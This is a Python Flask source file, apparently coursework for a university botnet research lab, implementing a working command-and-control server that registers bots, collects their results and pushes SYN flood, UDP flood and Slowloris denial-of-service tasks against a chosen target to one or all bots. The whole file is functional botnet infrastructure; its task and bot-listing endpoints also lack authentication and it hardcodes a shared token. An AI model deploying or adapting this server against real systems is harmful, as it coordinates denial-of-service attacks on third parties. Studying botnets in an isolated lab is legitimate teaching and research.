"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: C2 Server (Phase 1 - Star Topology)
 Environment: ISOLATED VM LAB ONLY (192.168.100.0/24)
              NO EXTERNAL NETWORK CONNECTIVITY
====================================================
"""

import threading
import time
import hashlib
import json
from datetime import datetime
from queue import Queue
from flask import Flask, request, jsonify

app = Flask(__name__)

# ── shared state ──────────────────────────────────
REGISTERED_BOTS = {}          # bot_id -> {ip, last_seen, arch, hostname}
TASK_QUEUES = {}              # bot_id -> Queue of tasks
AUTH_TOKEN = "LAB_RESEARCH_TOKEN_2026"
lock = threading.Lock()

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[C2 {ts}] {msg}")

def auth(req):
    return req.headers.get("X-Auth-Token") == AUTH_TOKEN

# ── bot registration ──────────────────────────────
@app.route("/register", methods=["POST"])
def register():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data = request.get_json()
    bot_id = data.get("bot_id")
    if not bot_id:
        return jsonify({"error": "no bot_id"}), 400
    with lock:
        REGISTERED_BOTS[bot_id] = {
            "ip": request.remote_addr,
            "hostname": data.get("hostname", "unknown"),
            "arch": data.get("arch", "unknown"),
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "heartbeat_count": 0
        }
        TASK_QUEUES[bot_id] = Queue()
    log(f"NEW BOT  id={bot_id}  ip={request.remote_addr}  arch={data.get('arch','?')}")
    return jsonify({"status": "registered", "bot_id": bot_id})

# ── heartbeat / task pickup ───────────────────────
@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data = request.get_json()
    bot_id = data.get("bot_id")
    with lock:
        if bot_id not in REGISTERED_BOTS:
            return jsonify({"error": "unknown bot"}), 404
        REGISTERED_BOTS[bot_id]["last_seen"] = datetime.now().isoformat()
        REGISTERED_BOTS[bot_id]["heartbeat_count"] += 1
        task = None
        if not TASK_QUEUES[bot_id].empty():
            task = TASK_QUEUES[bot_id].get()
    log(f"HEARTBEAT  id={bot_id}  task={'NONE' if not task else task['type']}")
    return jsonify({"task": task})

# ── result reporting ──────────────────────────────
@app.route("/result", methods=["POST"])
def result():
    if not auth(request):
        return jsonify({"error": "unauthorized"}), 403
    data = request.get_json()
    bot_id = data.get("bot_id")
    log(f"RESULT  id={bot_id}  payload={json.dumps(data.get('result',''))[:120]}")
    return jsonify({"status": "received"})

# ── botmaster console endpoints ───────────────────
@app.route("/bots", methods=["GET"])
def list_bots():
    """Show all registered bots and their status."""
    with lock:
        now = time.time()
        output = {}
        for bid, info in REGISTERED_BOTS.items():
            output[bid] = info.copy()
    return jsonify(output)

@app.route("/task", methods=["POST"])
def push_task():
    """
    Push a task to one or all bots.
    Body: {"bot_id": "all"|"<id>", "type": "syn_flood|udp_flood|slowloris|idle",
           "target_ip": "...", "target_port": 80, "duration": 10}
    """
    data = request.get_json()
    bot_id = data.get("bot_id", "all")
    task = {
        "type": data.get("type", "idle"),
        "target_ip": data.get("target_ip", "192.168.100.20"),
        "target_port": data.get("target_port", 80),
        "duration": data.get("duration", 10),
        "issued_at": datetime.now().isoformat()
    }
    with lock:
        targets = list(REGISTERED_BOTS.keys()) if bot_id == "all" else [bot_id]
        for tid in targets:
            if tid in TASK_QUEUES:
                TASK_QUEUES[tid].put(task)
    log(f"TASK PUSHED  target={bot_id}  type={task['type']}  dst={task['target_ip']}:{task['target_port']}")
    return jsonify({"status": "queued", "task": task, "targets": targets})

if __name__ == "__main__":
    print("=" * 60)
    print(" C2 Server - AUA Botnet Research Lab")
    print(" ISOLATED ENVIRONMENT ONLY")
    print(" Listening on 0.0.0.0:5000")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False)
